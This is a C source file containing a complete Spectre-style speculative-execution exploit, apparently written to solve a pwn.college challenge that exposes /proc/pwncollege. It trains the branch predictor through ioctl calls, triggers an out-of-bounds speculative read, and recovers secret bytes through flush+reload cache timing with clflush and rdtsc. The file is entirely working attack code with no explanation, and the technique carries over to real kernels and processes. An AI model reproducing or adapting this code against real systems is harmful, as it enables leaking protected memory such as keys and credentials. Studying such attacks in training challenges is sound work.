#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>
#include <sched.h>
#include <stdbool.h>

#define CACHE_HIT_THRESHOLD 120
#define PAGE_SIZE 4096
#define SECRET_LEN 10

int fd;
volatile char *mapped_mem;

// Flush cache lines we're interested in
void pre_work() {
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&mapped_mem[i * PAGE_SIZE]);
    }
    _mm_mfence();
}

// Measure access time without flushing
uint64_t time_access(void *addr) {
    uint64_t start, end;
    _mm_mfence();
    start = __rdtsc();
    volatile char x = *(volatile char*)addr;
    _mm_mfence();
    end = __rdtsc();
    return end - start;
}

// Train the branch predictor to expect the bounds check to pass
void train_branch_predictor() {
    for (int i = 0; i < 4000; i++) {
       
       
        *(volatile uint32_t*)mapped_mem = 5;
        _mm_mfence();
        
       
        ioctl(fd, 0, 0);
        
        
    }
}

void speculate(int secret_index) {
    // Set a value that should fail bounds check but trigger speculation
    *(volatile uint32_t*)mapped_mem = 6 + secret_index;
    _mm_mfence();
    ioctl(fd, 0, 0);
}

int post_work() {
    for (int i = 1; i < 256; i++) {
        int mix_i = ((i * 167) + 13) & 255;
        if (mix_i == 0) continue;
        
        uint64_t time = time_access(&mapped_mem[mix_i * PAGE_SIZE]);
        if (time < CACHE_HIT_THRESHOLD) {
            printf("Cache hit! %d ('%c') timing: %ld\n", 
                   mix_i, 
                   (mix_i >= 32 && mix_i <= 126) ? mix_i : '.', 
                   time);
            return mix_i;
        }
    }
    return -1;
}

void exploit() {
    printf("Starting Spectre attack...\n");
    
    for (int pos = 10; pos < 20; pos++) {
        printf("Attacking position %d...\n", pos);
        
        int attempts_with_result = 0;
        int stats[256] = {0};
        
        for (int attempt = 0; attempt < 1000; attempt++) {
            pre_work();
            usleep(100);
            train_branch_predictor();
            usleep(100);
            pre_work();
            speculate(pos);
            
            int result = post_work();
            if (result > 0) {
                stats[result]++;
                attempts_with_result++;
            }
        }
        
        // Find most frequent result
        int best_byte = 0;
        int max_count = 0;
        for (int i = 0; i < 256; i++) {
            if (stats[i] > max_count) {
                max_count = stats[i];
                best_byte = i;
            }
        }
        
        printf("Position %d: '%c' (0x%02x) appeared %d times out of %d attempts\n", 
               pos, (best_byte >= 32 && best_byte <= 126) ? best_byte : '.', 
               best_byte, max_count, attempts_with_result);
        
        if (best_byte == 0) break;
    }
}

int main() {
    printf("Opening device...\n");
    fd = open("/proc/pwncollege", O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    printf("Mapping memory...\n");
    // Map a larger region to use as probe array
    mapped_mem = mmap(NULL, 256 * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (mapped_mem == MAP_FAILED) {
        perror("mmap");
        close(fd);
        return 1;
    }

    printf("Memory mapped at: %p\n", mapped_mem);
    
    // Initialize the mapped memory
    memset((void*)mapped_mem, 1, 256 * PAGE_SIZE);

    // Pin to CPU core for consistent timing
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    sched_setaffinity(0, sizeof(set), &set);
    
    exploit();
    
    // Cleanup
    munmap((void*)mapped_mem, 256 * PAGE_SIZE);
    close(fd);
    
    return 0;
}
